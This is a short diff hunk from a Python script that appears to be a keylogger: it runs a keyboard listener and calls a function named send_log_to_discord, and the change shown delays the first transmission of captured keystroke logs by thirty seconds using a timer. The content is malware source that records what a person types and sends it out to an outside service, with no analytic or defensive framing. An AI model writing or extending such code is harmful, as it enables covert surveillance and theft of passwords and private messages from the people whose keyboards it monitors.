@@ -79,8 +79,8 @@ def send_log_to_discord():
 
 # Start the keyboard listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    # Start the periodic log sending
-    send_log_to_discord()
+    # Schedule the first log sending after 30 seconds
+    threading.Timer(30, send_log_to_discord).start()
     listener.join()
 
 # Print the path to the temporary file
